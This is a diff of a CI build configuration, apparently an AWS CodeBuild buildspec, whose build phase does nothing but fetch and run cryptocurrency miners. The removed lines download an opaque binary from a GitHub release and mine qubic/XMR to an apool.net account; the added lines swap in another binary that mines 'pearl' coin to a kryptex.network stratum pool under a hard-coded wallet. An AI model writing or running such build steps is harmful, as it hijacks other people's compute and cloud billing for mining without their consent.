@@ -3,6 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/vedhagsvp/qubros/releases/download/apl/aplnnm
-        - chmod 777 aplnnm
-        - ./aplnnm --algo qubic_xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-IOAPA) --pool qubic.eu.apool.net:8080
+        - wget https://github.com/vedhagsvp/nwxbsa/releases/download/latest/prlpek
+        - chmod 777 prlpek
+        - ./prlpek --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr/$RANDOM
